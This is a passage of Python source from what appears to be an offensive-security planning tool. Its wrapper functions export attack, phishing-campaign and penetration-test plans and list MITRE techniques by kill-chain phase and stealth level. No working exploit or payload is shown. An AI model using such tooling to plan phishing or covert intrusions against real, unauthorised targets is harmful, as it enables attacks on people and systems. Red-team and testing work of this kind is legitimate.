        Attack plan as dictionary
    """
    planner = AttackPlanner(OPSECLevel(opsec))
    plan = planner.create_plan(name, targets, objectives)
    return json.loads(planner.export_plan(plan, "json"))


def create_phishing_plan(targets: List[Dict]) -> Dict:
    """Create phishing campaign plan."""
    plan = CampaignTemplates.phishing_campaign(targets)
    return json.loads(AttackPlanner().export_plan(plan, "json"))


def create_pentest_plan(targets: List[Dict]) -> Dict:
    """Create penetration test plan."""
    plan = CampaignTemplates.network_pentest(targets)
    return json.loads(AttackPlanner().export_plan(plan, "json"))


def get_technique_info(technique_id: str) -> Optional[Dict]:
    """Get detailed information about a MITRE technique."""
    technique = TechniqueLibrary.get_by_id(technique_id)
    if not technique:
        return None

    return {
        "id": technique.id,
        "name": technique.name,
        "tactic": technique.tactic,
        "description": technique.description,
        "phase": technique.phase.value,
        "tool_commands": technique.tool_commands,
        "manual_steps": technique.manual_steps,
        "detection_indicators": technique.detection_info,
        "requirements": technique.requirements,
        "opsec_impact": technique.opsec_impact,
        "difficulty": technique.difficulty,
        "mitre_url": technique.mitre_url,
    }


def list_techniques_by_phase(phase: str, opsec: str = "normal") -> List[Dict]:
    """List available techniques for a kill chain phase."""
    opsec_level = OPSECLevel(opsec)
    max_opsec = {
        OPSECLevel.LOUD: 5,
        OPSECLevel.NORMAL: 4,
        OPSECLevel.CAREFUL: 3,
        OPSECLevel.STEALTHY: 2,
        OPSECLevel.APT: 1,
    }[opsec_level]

    try:
        kc_phase = KillChainPhase(phase)
    except ValueError:
        return []

    techniques = TechniqueLibrary.get_techniques(kc_phase, max_opsec)

    return [
        {
            "id": t.id,
            "name": t.name,
            "tactic": t.tactic,
            "opsec_impact": t.opsec_impact,
            "difficulty": t.difficulty,
        }
        for t in techniques
    ]
